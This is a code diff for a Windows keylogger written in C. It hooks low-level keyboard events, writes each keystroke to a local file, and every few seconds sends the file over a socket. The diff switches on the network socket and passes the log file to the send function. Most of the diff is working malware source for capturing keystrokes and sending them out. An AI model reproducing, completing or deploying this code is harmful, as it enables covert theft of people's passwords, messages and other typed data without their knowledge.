@@ -110,13 +110,6 @@ const struct keyboard keyboard[] =
 	{ VK_APPS, "[APPS]" },
 	{ 0, "[UNKNOWN]" }
 };
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
-{
-	LPKBDLLHOOKSTRUCT kb;
-	kb = (LPKBDLLHOOKSTRUCT)lparam;
-	printf("%u\n", kb->vkCode);
-	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
-}
 	
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
@@ -126,12 +119,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
-#if 1
 	if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYDOWN && shift == 0) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
 		shift = 1;
 	else if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYUP && shift == 1) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 1)))
 		shift = 0;
-#endif // 0
 
 	if (wparam == WM_KEYDOWN)
 	{
@@ -163,49 +154,36 @@ void	save_data(const char *data)
 	static int nbChar;
 	static time_t timet1;
 	static double countTime;
-
+	FILE *file;
 	time_t timet2 = 0;
-
-	//Sleep(3000);
-	time(&timet2);
-
 	double elapseTime = 0;
 
+	time(&timet2);
 	if (timet1 != 0)
 		elapseTime = difftime(timet2, timet1);
-
-	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
 	_write(_fileno(file), data, (unsigned int)strlen(data));
-
 	countTime = countTime + elapseTime;
-
 	if (nbChar > 59)
 	{
 		if (vfprintf_s(file, "\n", NULL) < 0)
 			_wperror(L" Add \\n at the end of the file failed ");
 		nbChar = 0;
 	}
-
 	if (countTime > 5)
 	{
-		send_data(my_sock);
+		printf("coucou je suis dans le count time\n");
+		send_data(my_sock, file);
 		countTime = 0;
 		if (fclose(file) != 0)
 			_wperror(L" Close file failed ");
 		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
 			_wperror(L" Open file failed ");
 	}
-
 	if (fclose(file) != 0)
 		_wperror(L" Close file failed ");
-
-	//printf("ElapseTime : %f\n", elapseTime);
-	//printf("CountTime : %f\n", countTime);
-
 	timet1 = timet2;
-
 	nbChar++;
 
 }
@@ -216,7 +194,7 @@ int	main(void)
 	WSADATA wsadata;
 	
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
-	//my_sock = init_socket(my_sock);
+	my_sock = init_socket(my_sock);
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
